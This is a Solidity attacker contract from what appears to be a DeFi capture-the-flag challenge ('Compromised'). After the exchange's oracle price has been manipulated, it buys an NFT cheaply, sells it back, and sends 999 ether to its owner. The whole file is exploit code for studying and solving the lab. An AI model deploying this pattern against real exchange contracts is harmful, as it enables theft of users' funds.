// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Attacker.sol";

// grantRole

interface IExchange {
    function buyOne() external payable returns (uint256 id);
    function sellOne(uint256 id) external;
}

/**
 * @title CompromisedAttacker
 * @dev This contract is used to exploit the "Exchange" contract's vulnerability.
 * @author Kristian Apostolov @CrisCodesCrap
 */
contract CompromisedAttacker is Attacker, IERC721Receiver {

    IExchange private immutable exchange;
    IERC721 private immutable token;
    uint256 private nft;

    constructor(address _exchange, address _token) payable {
        exchange = IExchange(_exchange);
        token = IERC721(_token);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function startAttack() external override onlyOwner {
        // simply buying the NFT from the exchange after the price has been manipulated
        nft = exchange.buyOne{value: address(this).balance}();
    }

    function withdrawFunds() external onlyOwner {
        // Selling the NFT for the balance of the contract
        token.approve(address(exchange), nft);
        exchange.sellOne(nft);
        payable(owner()).transfer(999 ether);
    }
}
    